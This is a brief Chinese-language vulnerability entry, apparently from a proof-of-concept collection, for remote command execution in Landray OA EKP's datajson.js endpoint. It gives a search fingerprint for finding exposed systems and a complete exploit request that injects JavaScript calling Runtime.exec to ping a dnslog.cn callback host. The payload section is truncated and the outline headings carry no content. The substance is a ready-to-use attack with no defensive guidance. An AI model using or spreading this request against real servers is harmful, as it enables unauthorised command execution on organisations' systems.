# 蓝凌OAEKPdatajson存在远程命令执行漏洞

- **系统**：蓝凌　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="Landray 蓝凌OA"`
- **请求**：`GET /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function%20test()%7B%20return%20java.lang.Runtime%7D;r=test();r.getRuntime().exec(%22ping%20-c%204%205vfzyo.dnslog.cn%22)&type=1 HTTP/1.1`

**请求体 / payload**
```

\[landray\_ekp\_datajson\_rce.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 蓝凌OA EKP datajson存在远程命令执行漏洞: * 一、漏洞简介
* 二、漏洞简介
* 三、资产测绘
* 四、漏洞复现
***